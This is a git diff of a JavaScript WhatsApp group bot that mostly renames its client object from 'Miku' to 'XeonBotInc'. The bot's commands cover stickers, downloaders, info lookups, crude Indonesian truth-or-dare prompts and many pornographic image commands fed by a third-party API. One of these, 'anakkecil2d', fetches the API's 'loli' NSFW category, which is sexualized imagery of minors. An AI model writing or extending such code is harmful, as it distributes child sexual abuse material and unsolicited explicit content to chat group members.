-let encmedia = await Miku.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
+let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
 await fs.unlinkSync(encmedia)
 } else {
 reply(`Kirim Foto/Video ${prefix + command}\nCuma Durasi vidio 1-9 detik yang dibolehin!`)
@@ -3650,10 +3277,10 @@ if (!text) return reply(`Send/Reply Photo With Caption ${prefix + command} *text
 if (text.includes('|')) return reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
 if (!/image/.test(mime)) return reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
 reply(mess.waiting)
-mee = await Miku.downloadAndSaveMediaMessage(quoted)
+mee = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
 mem = await TelegraPh(mee)
 meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
-memek = await Miku.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
+memek = await XeonBotInc.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(memek)
 await fs.unlinkSync(mee)
 }
@@ -3665,12 +3292,12 @@ case 'sgif': case 'sticker': case 's': {
 
  if (/image/.test(mime)) {
  let media = await quoted.download()
- let encmedia = await Miku.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
+ let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
  await fs.unlinkSync(encmedia)
  } else if (/video/.test(mime)) {
  if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds!')
  let media = await quoted.download()
- let encmedia = await Miku.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
+ let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
  await fs.unlinkSync(encmedia)
  } else {
  reply(`Kirim Foto/Video dengan textnya ${prefix + command}\nDurasi Vidio 1-9 Detik`)
@@ -3686,7 +3313,7 @@ const res2 = await wikiSearch(q).catch(e => {
 return reply('Error, Hasil Tidak Ditemukan!') 
 }) 
 const result2 = `*Title :* ${res2[0].judul}\n*Wiki :* ${res2[0].wiki}`
-Miku.sendMessage(from, { image : { url : res2[0].thumb }, caption : result2}) 
+XeonBotInc.sendMessage(from, { image : { url : res2[0].thumb }, caption : result2}) 
 break
 
 case 'gempa':
@@ -3696,7 +3323,7 @@ const tres = await Gempa()
 var { Waktu, Lintang, Bujur, Magnitude, Kedalaman, Wilayah, Map } = tres.result
 console.log(Map)
 const captt = `Time : ${Waktu}\nLatitude : ${Lintang}\nLongitude : ${Bujur}\nWilayah : ${Wilayah}`
-Miku.sendMessage(from, { image : { url : Map }, caption : captt})
+XeonBotInc.sendMessage(from, { image : { url : Map }, caption : captt})
 break
 
 case 'covidinfo':
@@ -3705,7 +3332,7 @@ case 'covid':
     if (isBanChat) return reply(mess.bangc)
 const c = await covid()
 var { kasus, kematian, sembuh } = c[0]
-Miku.sendMessage(from, {text : `Case : ${kasus}\n\nMeninggal : ${kematian}\n\nSembuh : ${sembuh}`}, m)
+XeonBotInc.sendMessage(from, {text : `Case : ${kasus}\n\nMeninggal : ${kematian}\n\nSembuh : ${sembuh}`}, m)
 break
 
 
@@ -3723,7 +3350,7 @@ return reply (`Hoho Tidak semudah itu santoso`)
 }
 const sangeh = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
-Miku.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nJawaban : *${sange}%*` }, { quoted: m })
+XeonBotInc.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nJawaban : *${sange}%*` }, { quoted: m })
 					break
 
 
@@ -3792,9 +3419,9 @@ Miku.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nJawaban : *${sange}
 	 "jikalau kamu dipaksa untuk meng NTR antara istri pahlawan dan raja, mana yg kamu pilih?",
          "Katakan MAMAT PEDO"
      ]
-                   const Mikudareww = dare[Math.floor(Math.random() * dare.length)]
+                   const XeonBotIncdareww = dare[Math.floor(Math.random() * dare.length)]
                    buffer = await getBuffer(`https://telegra.ph/file/9c8909ec77adaf2ef1efb.jpg`)
-                   Miku.sendMessage(from, { image: buffer, caption: '*tidak melakukan tantangannya ? potong ae tu titid!!!*\n\n\nTantangannya : '+ Mikudareww }, {quoted:m})
+                   XeonBotInc.sendMessage(from, { image: buffer, caption: '*tidak melakukan tantangannya ? potong ae tu titid!!!*\n\n\nTantangannya : '+ XeonBotIncdareww }, {quoted:m})
                    break
                        
 
@@ -3832,9 +3459,9 @@ const truth =[
 "Tar dulu , gw pengen ngentot"
                  
              ]
-                           const mikutruthww = truth[Math.floor(Math.random() * truth.length)]
+                           const XeonBotInctruthww = truth[Math.floor(Math.random() * truth.length)]
                            buffer = await getBuffer(`https://telegra.ph/file/9c8909ec77adaf2ef1efb.jpg`)
-                           Miku.sendMessage(from, { image: buffer, caption: '*Gajawab mandul*\n\n'+ mikutruthww }, {quoted:m})
+                           XeonBotInc.sendMessage(from, { image: buffer, caption: '*Gajawab mandul*\n\n'+ XeonBotInctruthww }, {quoted:m})
                            break
 
 
@@ -3854,14 +3481,14 @@ const result4 = `「  *Mediafire Downloader*  」
 *Mime* : ${baby1[0].mime}
 *Link* : ${baby1[0].link}`
 reply(`${result4}`)
-Miku.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(mess.error))
+XeonBotInc.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(mess.error))
 }
 break
 
 case 'report':{
 if (!args.join(" ")) return reply (`Contoh : *-report Fitur Nhentai Rusak bang*`)
 let text = `${args.join(" ")}\n\n${m.sender}`
-Miku.sendMessage(`6285161888973@s.whatsapp.net`, {text : text},{quoted : fvn})
+XeonBotInc.sendMessage(`6285161888973@s.whatsapp.net`, {text : text},{quoted : fvn})
 reply (`Laporan mu sudah diterima owner. Terima Kasih.\n\nPerlu di Ingat! Jika kamu hanya iseng saja, Maka kamu bakalan diblokir oleh Owner Sehingga kamu tidak bisa menggunakan Bot lagi.`)
 }
 break
@@ -3890,7 +3517,7 @@ let text = `ɪɴɢɪɴ ᴍᴇɴᴊᴀᴅɪ ᴅᴏɴᴀᴛᴜʀ?
     footer : 'ᴍɪᴜɴᴀ',
     headerType : 4,
     }
- Miku.sendMessage(m.chat, buttonMessage,{ quoted : m})
+ XeonBotInc.sendMessage(m.chat, buttonMessage,{ quoted : m})
 }
 break
 case 'googledrive': case 'gdrive': {
@@ -3918,13 +3545,13 @@ document: fs.readFileSync('./Rimed/Ri.xlsx'),
     buttons : but,
     headerType : 4
 }
-Miku.sendMessage(m.chat, butmes,{quoted : m})
+XeonBotInc.sendMessage(m.chat, butmes,{quoted : m})
 }
 break
 case 'gdown':{
 if(!isMod) return reply(mess.mod)
 let ri = await fetchJson(`https://malesin.xyz/gdrive?url=${args.join(" ")}`)
-Miku.sendMessage(m.chat, {document: {url : ri.downloadUrl }, fileName : `${ri.fileName}`, mimetype: `${ri.mimetype}`})
+XeonBotInc.sendMessage(m.chat, {document: {url : ri.downloadUrl }, fileName : `${ri.fileName}`, mimetype: `${ri.mimetype}`})
 }
 break
 
@@ -4041,9 +3668,9 @@ rows: [
 
 ]}
 sections.push(yy)
-Miku.sendImage(m.chat, ri.result.image[0])
+XeonBotInc.sendImage(m.chat, ri.result.image[0])
 await sleep(1500)
-Miku.sendMessage(from, { text: teks, buttonText: "ʙᴀᴄᴀ ᴅɪ ᴡᴀɴɢsᴀғ!!!",sections},{quoted : m})
+XeonBotInc.sendMessage(from, { text: teks, buttonText: "ʙᴀᴄᴀ ᴅɪ ᴡᴀɴɢsᴀғ!!!",sections},{quoted : m})
 }
 break
 
@@ -4068,7 +3695,7 @@ let sections = []
      }
      sections.push(list)   
      }
-  const sendm =  Miku.sendMessage(
+  const sendm =  XeonBotInc.sendMessage(
       from, 
       {
        text: `Nhentai Search!`,
@@ -4085,7 +3712,7 @@ if(!args[0]) return reply(`😳`)
 if(args[0] === "undefined") { 
 return reply (`ᴍᴜɴɢᴋɪɴ sᴜᴅᴀʜ ᴇɴᴅ ᴋᴀᴋ!`)
 }
-Miku.sendImage(m.chat, `${args.join(" ")}`)
+XeonBotInc.sendImage(m.chat, `${args.join(" ")}`)
 }
 break
 case 'nhentaipdf': {
@@ -4097,7 +3724,7 @@ reply(mess.waiting)
 henid = args[0]
 d = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${lolkey}`)
  hasil = d.result
-Miku.sendMessage(m.chat, { document : { url : hasil}, fileName : `${henid}.pdf`, mimetype: `application/pdf` })
+XeonBotInc.sendMessage(m.chat, { document : { url : hasil}, fileName : `${henid}.pdf`, mimetype: `application/pdf` })
 }
 break
 
@@ -4110,7 +3737,7 @@ reply (`Sek...`)
 link = args[0]
 ri = await fetchJson(`https://api.lolhuman.xyz/api/zippyshare?apikey=${lolkey}&url=${link}`)
 hasil = await getBuffer(ri.result.download_url)
-Miku.sendMessage(m.chat, { document : hasil , fileName : `${ri.result.file_name}`, mimetype : `video/mp4`},{quoted : m})
+XeonBotInc.sendMessage(m.chat, { document : hasil , fileName : `${ri.result.file_name}`, mimetype : `video/mp4`},{quoted : m})
 }
 break
 case 'download':{
@@ -4118,7 +3745,7 @@ if (!isCreator) return reply (`...`)
 let link = q.split('|')[0] ? q.split('|')[0] : q
 let judul = q.split('|')[1] ? q.split('|')[1] : q
 let mime = q.split('|')[2] ? q.split('|')[2] : ''
-Miku.sendMessage (m.chat, {document : {url : link},fileName : `${judul}`, mimetype : `${mime}` })
+XeonBotInc.sendMessage (m.chat, {document : {url : link},fileName : `${judul}`, mimetype : `${mime}` })
 }
 break
 
@@ -4140,7 +3767,7 @@ let sections = []
      }
      sections.push(list)   
      }
-  const sendm =  Miku.sendMessage(
+  const sendm =  XeonBotInc.sendMessage(
       from, 
       {
        text: `「 xɴxx sᴇᴀʀᴄʜ ᴇɴɢɪɴᴇ 」\n\nᴋᴀʟᴏ ᴅᴜʀᴀsɪ 𝟷ᴊᴀᴍ ʟᴇʙɪʜ, ᴛᴏʟᴏɴɢ ᴊᴀɴɢᴀɴ ᴅɪᴘᴇɴᴄᴇᴛ ᴛᴏᴍʙᴏʟɴʏᴀ ʏᴀʜ, ɢᴀʙᴀᴋᴀʟ ʙɪsᴀ sᴏᴀʟɴʏᴀ:ᴠ`,
@@ -4173,7 +3800,7 @@ caption : teks ,
 footer : `ᴍɪᴜɴᴀ`,
 headerType : 1
 }
-Miku.sendMessage(m.chat, buttonMessage ,{quoted : m}).catch((err) => {reply(`Web Error!`)})
+XeonBotInc.sendMessage(m.chat, buttonMessage ,{quoted : m}).catch((err) => {reply(`Web Error!`)})
 }
 break
 
@@ -4194,7 +3821,7 @@ await sleep(5000)
   buttons: buttonkontol,
   headerType: 1
   }      
-Miku.sendMessage(m.chat, gachatt, { quoted:m })
+XeonBotInc.sendMessage(m.chat, gachatt, { quoted:m })
 }
 break	
 
@@ -4207,7 +3834,7 @@ case 'nyepong':
 case 'tusbol':
 case 'pantsu' :
 case 'oppai' :
-case 'hmiku' :
+case 'hXeonBotInc' :
 case 'memew' :
 case 'cwexcwe':
 case 'hcosplay': {
@@ -4228,7 +3855,7 @@ await sleep(5000)
   buttons: buttonkontol,
   headerType: 1
   }      
-Miku.sendMessage(m.chat, gachatt, { quoted:m })
+XeonBotInc.sendMessage(m.chat, gachatt, { quoted:m })
 }
 break	
 
@@ -4242,7 +3869,7 @@ reply(mess.waiting)
 await sleep(5000)
 anu = await hentai()
 result912 = anu[Math.floor(Math.random(), anu.length)]
-Miku.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `Judul : ${result912.title}\nKategori : ${result912.category}\n$Mimetype : ${result912.type}\nViews : ${result912.views_count}\nShares : ${result912.share_count}\nSource : ${result912.link}\nMedia Url : ${result912.video_1}` }, { quoted: m })
+XeonBotInc.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `Judul : ${result912.title}\nKategori : ${result912.category}\n$Mimetype : ${result912.type}\nViews : ${result912.views_count}\nShares : ${result912.share_count}\nSource : ${result912.link}\nMedia Url : ${result912.video_1}` }, { quoted: m })
 }
 break
 
@@ -4262,7 +3889,7 @@ await sleep(5000)
   buttons: trapbot,
   headerType: 1
   }   
-            await Miku.sendMessage(m.chat, button2Messages, { quoted:m }).catch(err => {
+            await XeonBotInc.sendMessage(m.chat, button2Messages, { quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -4290,7 +3917,7 @@ buttons : butjem,
 headerType : 4
 }
 await sleep(10000)
-Miku.sendMessage(m.chat, jembut,{quoted : m})
+XeonBotInc.sendMessage(m.chat, jembut,{quoted : m})
 }	
 break
 		
@@ -4321,7 +3948,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolkey}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"Silahkeun!"}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Silahkeun!"}, {quoted:m})
 break
 		case 'ketec':
 		
@@ -4330,7 +3957,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/random/nsfw/animearmpits?apikey=${lolkey}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"Jilat noh ketec"}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Jilat noh ketec"}, {quoted:m})
 break
 	
 		case 'milfu':
@@ -4340,7 +3967,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/random/nsfw/milf?apikey=${lolkey}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"Milf Saikouu!!!"}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Milf Saikouu!!!"}, {quoted:m})
 break
 		case 'anakkecil2d':
 		
@@ -4349,7 +3976,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/random/nsfw/loli?apikey=${lolkey}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"Tiati bang"}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Tiati bang"}, {quoted:m})
 break
 	
 		case 'liwed':
@@ -4359,7 +3986,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/random/nsfw/lewdanimegirls?apikey=${lolkey}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"_Colilah meskipun titit anda sudah loyo_!"}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"_Colilah meskipun titit anda sudah loyo_!"}, {quoted:m})
 break
 	
 		case 'lycoris':
@@ -4369,7 +3996,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/danbooru?apikey=${lolkey}&query=lycoris_recoil`
-Miku.sendMessage(from, {image:{url:nye}, caption:"Dapet ambatukam = GAY!"}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Dapet ambatukam = GAY!"}, {quoted:m})
 break
 		case 'spyxfamily':
 		
@@ -4378,7 +4005,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/danbooru?apikey=${lolkey}&query=spy_x_family`
-Miku.sendMessage(from, {image:{url:nye}, caption:"Kalo dapet yg mangtap ,tag Ri!"}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Kalo dapet yg mangtap ,tag Ri!"}, {quoted:m})
 break
 		
 		case 'nun':
@@ -4388,7 +4015,7 @@ break
    		if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/danbooru?apikey=${lolkey}&query=nun`
-Miku.sendMessage(from, {image:{url:nye}, caption:"Kalo dapet yg mangtap ,tag Ri!"}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Kalo dapet yg mangtap ,tag Ri!"}, {quoted:m})
 break
 		case 'femdom':
 		if (!isMod) return replay(mess.mod)
@@ -4398,7 +4025,7 @@ break
 		if (!AntiNsfw) return reply(mess.nonsfw)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/random/nsfw/hentaifemdom?apikey=${lolkey}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"Kalo dapet yg mangtap ,tag Ri!"}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Kalo dapet yg mangtap ,tag Ri!"}, {quoted:m})
 break
 		
 		case 'crot':
@@ -4407,7 +4034,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/random2/cum?apikey=${lolkey}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"ahh Crott!"}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"ahh Crott!"}, {quoted:m})
 break
 		
 	case 'abc':
@@ -4416,7 +4043,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/random2/yuri?apikey=${lolkey}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"ahh Crott!"}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"ahh Crott!"}, {quoted:m})
 break	
 	case 'tete':
 		if (!isBotAdmins) return replay(mess.botadmin)
@@ -4425,7 +4052,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/random2/tits?apikey=${lolkey}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
 break	
 	case 'memec':
 		if (!isMod) return replay(mess.mod)
@@ -4433,7 +4060,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/random2/pussy?apikey=${lolkey}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
 break	
 	case 'yurimesum':
 		if (!isMod) return replay(mess.mod)
@@ -4441,7 +4068,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/random2/eroyuri?apikey=${lolkey}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
 break	
 	case 'holoero':
 		if (!isBotAdmins) return replay(mess.botadmin)
@@ -4450,7 +4077,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/random2/holoero?apikey=${lolkey}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
 break	
 	case 'nekochan':
 		if (!isBotAdmins) return replay(mess.botadmin)
@@ -4459,7 +4086,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/random/nsfw/neko?apikey=${lolkey}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
 break		
 		
 	case 'koelananglohmas':
@@ -4467,7 +4094,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/random/nsfw/trap?apikey=${lolkey}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"_Terdiam melihat kelakuanmu_ "}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"_Terdiam melihat kelakuanmu_ "}, {quoted:m})
 break	
 		
 		case 'slurp':
@@ -4477,7 +4104,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/random2/blowjob?apikey=${lolkey}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"_Sepong tros tuh batang_ "}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"_Sepong tros tuh batang_ "}, {quoted:m})
 break
 		case 'fetishkaki':
 		if (!isBotAdmins) return replay(mess.botadmin)
@@ -4486,7 +4113,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/random2/feet?apikey=${lolkey}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"_Jangan jilat layar blokk_ "}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"_Jangan jilat layar blokk_ "}, {quoted:m})
 break
 	
 		case 'pantat2d':
@@ -4495,7 +4122,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/random/nsfw/animebooty?apikey=${lolkey}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"_Jangan jilat layar blokk_ "}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"_Jangan jilat layar blokk_ "}, {quoted:m})
 break	
 
 
@@ -4506,7 +4133,7 @@ break
     if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 nye = `https://api.lolhuman.xyz/api/random/nsfw/biganimetiddies?apikey=${lolkey}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"_Sugoi Dekkai_ "}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"_Sugoi Dekkai_ "}, {quoted:m})
 break
 case 'glasses':  case 'mstrb':  case'tentacles':{
     if (!m.isGroup) return replay (mess.grouponly)
@@ -4525,7 +4152,7 @@ footer : `Miuna Bot`,
 headerType : 4,
 }
 await sleep(15000)
-Miku.sendMessage(from, buttonMessage,{quoted:m})
+XeonBotInc.sendMessage(from, buttonMessage,{quoted:m})
 }
 break
 	case 'meme' :{
@@ -4541,7 +4168,7 @@ footer : `ᴍɪᴜɴᴀ`,
 headerType : 4,
 }
 await sleep(15000)
-Miku.sendMessage(m.chat, buttonMessage,{quoted : fdocs })
+XeonBotInc.sendMessage(m.chat, buttonMessage,{quoted : fdocs })
 	}
 	break
 	case 'pat' : case 'Patrick':
@@ -4552,7 +4179,7 @@ reply(mess.waiting)
 var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
-encmedia = await Miku.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
+encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
 await fs.unlinkSync(encmedia)
 }
 break	
@@ -4576,7 +4203,7 @@ reply(mess.waiting)
   headerType: 1
   }  
   await sleep(15000)    
-            await Miku.sendMessage(m.chat, button3Messages, { quoted:m }).catch(err => {
+            await XeonBotInc.sendMessage(m.chat, button3Messages, { quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -4599,7 +4226,7 @@ reply(mess.waiting)
   headerType: 1
   } 
   await sleep(15000)     
-            await Miku.sendMessage(m.chat, button4Messages, { quoted:m }).catch(err => {
+            await XeonBotInc.sendMessage(m.chat, button4Messages, { quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -4621,7 +4248,7 @@ reply(mess.waiting)
       buttons: wbuttsss,
       headerType: 4
       }     
-            await Miku.sendMessage(m.chat, button12ssMessages,{ quoted:m }).catch(err => {
+            await XeonBotInc.sendMessage(m.chat, button12ssMessages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break   
@@ -4641,7 +4268,7 @@ case 'crossplay': case 'crosplay':
         headerType: 4
         }
                   
-        await Miku.sendMessage(m.chat,cosplybutton, { quoted:m }).catch(err => {
+        await XeonBotInc.sendMessage(m.chat,cosplybutton, { quoted:m }).catch(err => {
             return('Error!')
         })  
 
@@ -4666,7 +4293,7 @@ reply(mess.waiting)
       buttons: wbuttsss,
       headerType: 4
       }     
-            await Miku.sendMessage(m.chat, buttonssMessages,{ quoted:m }).catch(err => {
+            await XeonBotInc.sendMessage(m.chat, buttonssMessages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -4705,7 +4332,7 @@ console.log(musers)
         const response = await axios.get(pat.url,  { responseType: 'arraybuffer' })
         const buffer = Buffer.from(response.data, "utf-8")
 		var fetchedgif = await GIFBufferToVideoBuffer(buffer)
-		Miku.sendMessage(m.chat,{video: fetchedgif, gifPlayback:true,mentions:ment,caption:musers},{quoted:m})
+		XeonBotInc.sendMessage(m.chat,{video: fetchedgif, gifPlayback:true,mentions:ment,caption:musers},{quoted:m})
     } catch (error) {
         console.log(error);
     }
@@ -4742,7 +4369,7 @@ console.log(musers)
         const response = await axios.get(pat.url,  { responseType: 'arraybuffer' })
         const buffer = Buffer.from(response.data, "utf-8")
 		var fetchedgif = await GIFBufferToVideoBuffer(buffer)
-		Miku.sendMessage(m.chat,{video: fetchedgif, gifPlayback:true,mentions:ment,caption:musers},{quoted:m})
+		XeonBotInc.sendMessage(m.chat,{video: fetchedgif, gifPlayback:true,mentions:ment,caption:musers},{quoted:m})
     } catch (error) {
         console.log(error);
     }
@@ -4779,7 +4406,7 @@ console.log(musers)
         const response = await axios.get(pat.url,  { responseType: 'arraybuffer' })
         const buffer = Buffer.from(response.data, "utf-8")
 		var fetchedgif = await GIFBufferToVideoBuffer(buffer)
-		Miku.sendMessage(m.chat,{video: fetchedgif, gifPlayback:true,mentions:ment,caption:musers},{quoted:m})
+		XeonBotInc.sendMessage(m.chat,{video: fetchedgif, gifPlayback:true,mentions:ment,caption:musers},{quoted:m})
     } catch (error) {
         console.log(error);
     }
@@ -4821,7 +4448,7 @@ console.log(musers)
         const response = await axios.get(pat.url,  { responseType: 'arraybuffer' })
         const buffer = Buffer.from(response.data, "utf-8")
 		var fetchedgif = await GIFBufferToVideoBuffer(buffer)
-		Miku.sendMessage(m.chat,{video: fetchedgif, gifPlayback:true,mentions:ment,caption:musers},{quoted:m})
+		XeonBotInc.sendMessage(m.chat,{video: fetchedgif, gifPlayback:true,mentions:ment,caption:musers},{quoted:m})
     } catch (error) {
         console.log(error);
     }
@@ -4844,7 +4471,7 @@ var wbutsss = [
           buttons: wbutsss,
      headerType: 4
                       }
-await Miku.sendMessage(m.chat,buttonzMessage, { quoted:m }).catch(err => {
+await XeonBotInc.sendMessage(m.chat,buttonzMessage, { quoted:m }).catch(err => {
      return('Error!')
     })               
 break     
@@ -4865,7 +4492,7 @@ case 'awoo':
   buttons: wbuttsss,
   headerType: 2
   }       
-            await Miku.sendMessage(m.chat, button1Messages, { quoted:m }).catch(err => {
+            await XeonBotInc.sendMessage(m.chat, button1Messages, { quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -4915,7 +4542,7 @@ const { Anime } =require("@shineiichijo/marika")
       /\[Written by MAL Rewrite]/g,
       ""
     )}`
-Miku.sendMessage(m.chat,{image:{url:result.images.jpg.large_image_url},caption:details},{quoted:m})   
+XeonBotInc.sendMessage(m.chat,{image:{url:result.images.jpg.large_image_url},caption:details},{quoted:m})   
 break
 
 case 'manga':
@@ -4950,7 +4577,7 @@ let srh = await manga.searchManga(q)
       /\[Written by MAL Rewrite]/g,
       ""
     )}`;
-Miku.sendMessage(m.chat,{image:{url:srh.data[0].images.jpg.large_image_url},caption:mang},{quoted:m})   
+XeonBotInc.sendMessage(m.chat,{image:{url:srh.data[0].images.jpg.large_image_url},caption:mang},{quoted:m})   
 break
 
 
@@ -4973,7 +4600,7 @@ reply(mess.waiting)
         headerType: 2
          }     
                                   
-    await Miku.sendMessage(m.chat, buttonMessagessf, { quoted:m }).catch(err => {
+    await XeonBotInc.sendMessage(m.chat, buttonMessagessf, { quoted:m }).catch(err => {
         return('error..')
         })
 break
@@ -4999,7 +4626,7 @@ case "darkjoke":
 if (isBanChat) return reply(mess.banChat)
 var res = await Darkjokes()
 teks = "\n🤭"
-Miku.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : m })
+XeonBotInc.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : m })
 break
 
 case 'code404': case 'keluar': case 'keluargrup': case 'bye': {
@@ -5008,7 +4635,7 @@ case 'code404': case 'keluar': case 'keluargrup': case 'bye': {
     if (!m.isGroup) return replay(mess.grouponly)
         reply('Wakatta nii-sama!')
